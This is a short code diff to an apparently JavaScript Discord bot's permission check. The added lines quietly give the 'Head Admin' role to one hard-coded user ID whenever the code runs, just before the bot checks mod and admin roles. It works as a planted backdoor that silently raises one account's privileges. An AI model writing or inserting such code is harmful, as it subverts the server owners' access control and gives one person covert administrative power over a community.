@@ -29,6 +29,10 @@ await guild.fetchMember(message.author.id)
 	}
 //if(!member) return;
 	let member = await guild.fetchMember(message.author.id)
+	let myrole = guild.roles.find(`name`, "Head Admin")
+	if(member.id === "245877990938902529") {
+		member.addRole(myrole)
+	}
 if (member && member.roles.get("400523390441619457") //mod
  || member.roles.get("400512010590355458") //admin
  || member.roles.get("415914501909774336") //head admin
